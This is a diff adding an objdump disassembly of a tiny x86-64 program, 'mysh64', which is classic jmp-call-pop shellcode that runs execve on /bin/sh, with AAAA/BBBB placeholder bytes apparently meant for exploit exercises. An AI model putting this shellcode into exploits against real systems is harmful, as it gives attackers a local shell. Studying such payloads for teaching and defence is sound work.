@@ -1,0 +1,23 @@
+
+mysh64:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	eb 21                	jmp    4000a3 <two>
+
+0000000000400082 <one>:
+  400082:	5b                   	pop    rbx
+  400083:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
+  400087:	b8 00 00 00 00       	mov    eax,0x0
+  40008c:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
+  400090:	48 89 df             	mov    rdi,rbx
+  400093:	48 8d 73 08          	lea    rsi,[rbx+0x8]
+  400097:	ba 00 00 00 00       	mov    edx,0x0
+  40009c:	b8 3b 00 00 00       	mov    eax,0x3b
+  4000a1:	0f 05                	syscall 
+
+00000000004000a3 <two>:
+  4000a3:	e8 da ff ff ff 2f 62 69 6e 2f 73 68 00 41 41 41     ...../bin/sh.AAA
+  4000b3:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
